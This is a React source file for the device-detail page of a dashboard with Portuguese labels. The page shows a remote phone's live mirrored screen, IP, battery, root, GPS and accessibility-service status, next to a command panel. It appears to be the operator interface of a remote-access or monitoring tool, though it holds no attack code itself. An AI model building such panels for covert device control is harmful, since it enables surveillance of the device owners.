import { Layout } from "@/components/layout";
import { LiveScreen } from "@/components/device-tools";
import { CommandPanel } from "@/components/command-panel";
import { DeviceStatusBadge } from "@/components/device-grid";
import { useSocket } from "@/hooks/use-socket";
import { useGetDevice, getGetDeviceQueryKey } from "@workspace/api-client-react";
import { useParams, Link } from "wouter";
import { formatDistanceToNow } from "date-fns";

const G = "#00ff88";
const DIM = "#1a3a20";

function InfoRow({ label, value }: { label: string; value: React.ReactNode }) {
  return (
    <div style={{ display: "flex", justifyContent: "space-between", padding: "5px 10px", borderBottom: "1px solid #0a160c", fontSize: 10 }}>
      <span style={{ color: "#445", letterSpacing: "0.08em" }}>{label}</span>
      <span style={{ color: G, fontFamily: "'Courier New', monospace", textAlign: "right" }}>{value}</span>
    </div>
  );
}

export default function DeviceDetail() {
  const { id } = useParams<{ id: string }>();
  const deviceId = parseInt(id, 10);
  const socket = useSocket();
  const { data: device, isLoading } = useGetDevice(deviceId, {
    query: { enabled: !!deviceId, queryKey: getGetDeviceQueryKey(deviceId) },
  });

  if (isLoading) {
    return (
      <Layout>
        <div style={{ color: "#333", fontSize: 11, padding: 8 }}>
          &gt; loading device {id}<span className="blink">_</span>
        </div>
      </Layout>
    );
  }

  if (!device) {
    return (
      <Layout>
        <div style={{ color: "#ff4444", fontSize: 11, padding: 8 }}>
          [ERR] DEVICE NOT FOUND: ID={id}
          <br />
          <Link href="/devices" style={{ color: "#00ff00" }}>&gt; BACK TO DEVICE LIST</Link>
        </div>
      </Layout>
    );
  }

  return (
    <Layout>
      <div
        style={{
          display: "grid",
          gridTemplateColumns: "minmax(0, 1fr) 300px",
          gap: 10,
          height: "calc(100vh - 24px)",
          minHeight: 0,
        }}
      >
        {/* GIANT live screen — ~78% of viewport width via grid 1fr + 300px sidebar */}
        <section
          style={{
            display: "flex",
            flexDirection: "column",
            minHeight: 0,
            background: "#020a04",
            border: `1px solid ${G}`,
            boxShadow: `0 0 18px ${G}33`,
            padding: 10,
          }}
        >
          <div
            style={{
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              paddingBottom: 8,
              marginBottom: 8,
              borderBottom: `1px solid ${DIM}`,
            }}
          >
            <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
              <span style={{ color: G, fontSize: 13, fontWeight: "bold", letterSpacing: "0.18em" }}>
                ▸ ESPELHAMENTO AO VIVO // {device.name}
              </span>
              <DeviceStatusBadge status={device.status} />
            </div>
            <Link href="/devices" style={{ color: "#555", fontSize: 10, textDecoration: "none" }}>
              &lt; VOLTAR
            </Link>
          </div>
          <div style={{ flex: 1, minHeight: 0 }}>
            <LiveScreen device={device} socket={socket} />
          </div>
        </section>

        {/* Compact right sidebar: info + commands */}
        <aside
          style={{
            display: "flex",
            flexDirection: "column",
            gap: 10,
            minHeight: 0,
            overflowY: "auto",
          }}
        >
          <div style={{ border: `1px solid ${DIM}`, background: "#020a04" }}>
            <div
              style={{
                padding: "5px 10px",
                borderBottom: `1px solid ${DIM}`,
                fontSize: 9,
                fontWeight: "bold",
                letterSpacing: "0.12em",
                color: G,
              }}
            >
              &gt; INFORMAÇÕES
            </div>
            <InfoRow label="NOME" value={device.name} />
            <InfoRow label="MODELO" value={device.model} />
            <InfoRow label="SO" value={`${device.os} ${device.osVersion}`} />
            <InfoRow label="IP" value={device.ipAddress} />
            <InfoRow label="BATERIA" value={`${device.batteryLevel}%`} />
            <InfoRow
              label="VISTO"
              value={formatDistanceToNow(new Date(device.lastSeen), { addSuffix: true })}
            />
            <div style={{ padding: "8px 10px", display: "flex", gap: 4, flexWrap: "wrap" }}>
              {(device as any).hasRoot ? (
                <span style={{ background: "#331100", color: "#ffaa00", border: "1px solid #ffaa00", padding: "2px 6px", fontSize: 8 }}>ROOT</span>
              ) : (
                <span style={{ background: "#111", color: "#444", border: "1px solid #333", padding: "2px 6px", fontSize: 8 }}>ROOT</span>
              )}
              {(device as any).gpsActive ? (
                <span style={{ background: "#002200", color: G, border: `1px solid ${G}`, padding: "2px 6px", fontSize: 8 }}>GPS</span>
              ) : (
                <span style={{ background: "#111", color: "#444", border: "1px solid #333", padding: "2px 6px", fontSize: 8 }}>GPS</span>
              )}
              {(device as any).accessibilityOn ? (
                <span style={{ background: "#002200", color: G, border: `1px solid ${G}`, padding: "2px 6px", fontSize: 8 }}>ACC:ON</span>
              ) : (
                <span style={{ background: "#111", color: "#444", border: "1px solid #333", padding: "2px 6px", fontSize: 8 }}>ACC:OFF</span>
              )}
            </div>
          </div>

          <div style={{ flex: 1, minHeight: 200 }}>
            <CommandPanel preselectedDeviceId={deviceId} height={"100%" as any} />
          </div>
        </aside>
      </div>
    </Layout>
  );
}
